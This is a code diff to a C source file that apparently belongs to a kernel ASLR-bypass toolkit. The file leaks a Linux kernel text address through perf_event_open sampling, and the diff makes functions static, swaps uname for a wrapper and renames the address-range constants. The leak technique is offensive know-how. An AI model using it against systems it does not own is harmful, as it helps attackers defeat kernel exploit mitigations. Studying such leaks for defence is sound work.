@@ -56,12 +56,12 @@ KASLD_META("method:parsed\n"
            "bypass:CAP_PERFMON\n"
            "bypass:CAP_SYS_ADMIN\n");
 
-int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
-                    int group_fd, unsigned long flags) {
+static int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
+                           int group_fd, unsigned long flags) {
   return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-unsigned long get_kernel_addr_perf() {
+static unsigned long get_kernel_addr_perf(void) {
   int fd;
   pid_t child;
   unsigned long iterations = 100;
@@ -78,7 +78,7 @@ unsigned long get_kernel_addr_perf() {
   if (child == 0) {
     struct utsname self;
     while (1)
-      uname(&self);
+      kasld_uname(&self);
     return 0;
   }
 
@@ -183,7 +183,7 @@ unsigned long get_kernel_addr_perf() {
   if (fd > 0)
     close(fd);
 
-  if (min_addr >= KERNEL_BASE_MIN && min_addr <= KERNEL_BASE_MAX)
+  if (min_addr >= KERNEL_TEXT_MIN && min_addr <= KERNEL_TEXT_MAX)
     return min_addr;
 
   return 0;
